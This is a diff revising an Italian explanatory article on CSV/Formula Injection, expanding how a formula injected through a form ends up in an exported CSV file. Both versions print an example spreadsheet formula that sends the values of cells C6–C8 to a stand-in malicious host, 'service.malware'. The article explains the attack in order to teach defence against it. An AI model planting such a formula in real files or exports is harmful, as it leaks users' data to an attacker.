@@ -51,12 +51,13 @@ Qualora la vittima utilizzasse invece versioni precedenti della suite Office opp
 
 Attacchi di questo tipo mediante **Formula Injection** sono dunque degli stratagemmi per arrivare ad altre tipologie di attacchi ben più pericolosi quali **l'esecuzione di un comando** del Sistema Operativo o di una applicazione in modo indesiderato.
 
-Dal momento che si accennava agli hyperlink, un attaccante potrebbe sfruttare un attacco di questo tipo anche per l'invocazione di servizi web malevoli mediante la funzione per l'invocazione dei servizi web. 
-Ad esempio un attaccante potrebbe sfruttare la vulnerabilità per iniettare una formula che possa invocare un servizio web a sua scelta al fine di ricevere i dati presenti nelle colonne C6, C7 e C8 . L'utente ignaro di tutto potrebbe involontariamente invocare una HTTP Request verso il servizio malevolo:
+Dal momento che si accennava agli hyperlink, un attaccante potrebbe sfruttare un attacco di questo tipo anche per l'invocazione di servizi web malevoli mediante la funzione per l'invocazione dei servizi web.
+Ad esempio, un attaccante potrebbe sfruttare una tale vulnerabilità per iniettare una formula che consenta l'invocazione di un servizio web a sua scelta, al fine di ricevere i dati contenuti nelle altre celle. Tale formula potrà essere iniettata in un campo di input di un form, per essere poi salvata nel database applicativo.
+In un secondo momento, un utente che richiederà l'export dei dati otterrà così il file CSV in cui il valore di una delle cella conterrà questa formula potenzialmente dannosa. L'utente che aprirà il file CSV, ignaro di tutto, potrebbe (involontariamente) invocare una HTTP Request verso il servizio malevolo:
 
     =SERVIZIO.WEB(CONCATENA("http://service.malware?d="; C6&","&C7&","&C8))
 
-passando nel parametro "d" i dati che desidera, sfruttando così l'attacco **Formula Injection** ai fini di un **Data Breach** .
+passando nei parametri in GET i dati contenuti in determinate celle, essendo così vittima di un attacco di tipo **Formula Injection** ai fini di un **Data Breach** (come avviene con il parametro "d" che nell'esempio contiene la concatenazione dei valori presenti nelle celle C6, C7 e C8).
 
 Arrivati a questo punto ti starai chiedendo quali sono le strategie utili a neutralizzare questo tipo di attacchi.
 
